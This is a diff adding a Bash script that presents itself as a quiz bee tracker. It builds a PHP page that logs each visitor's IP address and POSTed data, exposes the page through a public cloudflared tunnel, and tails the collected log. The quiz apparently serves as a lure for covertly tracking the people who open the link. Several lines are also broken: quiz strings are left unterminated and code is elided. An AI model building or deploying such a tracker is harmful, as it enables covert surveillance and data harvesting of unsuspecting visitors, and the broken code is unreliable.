@@ -1,0 +1,81 @@
+#!/bin/bash
+# --- BEAST-TRACK v22.0 (SYNTAX FIXED & SADFRIENDS BANNER) ---
+NC='\033[0m'; Bold='\033[1m'
+PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
+BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'
+
+PORT=8888
+SERVER_DIR="server"
+
+# --- AUTO-REMOVE OLD SESSION ---
+mkdir -p $SERVER_DIR
+rm -f $SERVER_DIR/*.png > /dev/null 2>&1
+echo "--- SESSION RESTARTED: $(date) ---" > $SERVER_DIR/combined.log
+chmod -R 755 $SERVER_DIR
+
+clear
+
+# --- SadFriends ASCII Banner ---
+echo -e "${PBlue}${Bold} ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
+echo -e "${PBlue}${Bold} ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ${NC}"
+echo -e "${PWhite}${Bold} ██████╔╝█████╗ ███████║███████╗ ██║ ${NC}"
+echo -e "${PWhite}${Bold} ██╔══██╗██╔══╝ ██╔══██║╚════██║ ██║ ${NC}"
+echo -e "${PRed}${Bold} ██████╔╝███████╗██║ ██║███████║ ██║ ${NC}"
+echo -e "${PRed}${Bold} ╚═════╝ ╚══════╝╚═╝ ╚═╝╚══════╝ ╚═╝ ${NC}"
+echo -e " ${PYellow}⭐ ⭐ ⭐ QUIZ BEE TRACKER v22.0 ⭐ ⭐ ⭐${NC}"
+echo -e " ${BCyan}Created by : ${PWhite}${Bold}SadFriends${NC}"
+echo -e " ${BGreen}Status : ${PWhite}Educational Purpose Only${NC}"
+echo -e "${PWhite} ==========================================${NC}"
+
+# --- QUIZ SELECTION ---
+echo -e "\n ${BCyan}${Bold}[ PILI NG QUIZ SUBJECT ]${NC}"
+echo -e " ${PWhite} 1. MATHEMATICS${NC}"
+echo -e " ${PBlue} 2. SCIENCE${NC}"
+echo -e " ${BPurple} 3. ENGLISH${NC}"
+echo -e " ${PYellow} 4. HISTORY${NC}"
+read -p $'\n [*] Select ➤ ' q_opt
+
+case $q_opt in
+1) SUBJECT="MATH"; S_COLOR="          
+Q1="12 + 15?"; A1="27"; B1="29";
+Q2="9 x 8?"; A2="72"; B2="81";
+                         
+;;
+2) SUBJECT="SCIENCE"; S_COLOR="#2ecc71";
+# ... (rest of quiz data)
+;;
+3) SUBJECT="ENGLISH"; S_COLOR="         
+                         
+;;
+*) SUBJECT="HISTORY"; S_COLOR="#f1c40f";
+# ... (rest of quiz data)
+;;
+esac
+
+# --- PHP Backend ---
+cat <<EOF > $SERVER_DIR/index.php
+<?php
+\$ip = \$_SERVER['REMOTE_ADDR'];
+if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
+    \$type = \$_POST['type'] ?? '';
+    if (\$type == 'init') {
+        // ... (rest of PHP code)
+EOF
+
+# --- SERVER RUN ---
+echo -e "${BGreen}[*] Starting Beast-Track Hub...${NC}"
+php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
+PHP_PID=$!
+cloudflared tunnel --url http://127.0.0.1:$PORT > cf.log 2>&1 &
+CF_PID=$!
+while true; do
+    CF_LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cf.log)
+    if [ ! -z "$CF_LINK" ]; then
+        echo -e "\r${BGreen}[+] LINK: ${BWhite}${Bold}$CF_LINK${NC}";
+        break;
+    fi
+    sleep 1
+done
+
+trap "kill $PHP_PID $CF_PID; rm -f cf.log; exit" INT TERM EXIT
+tail -f $SERVER_DIR/combined.log
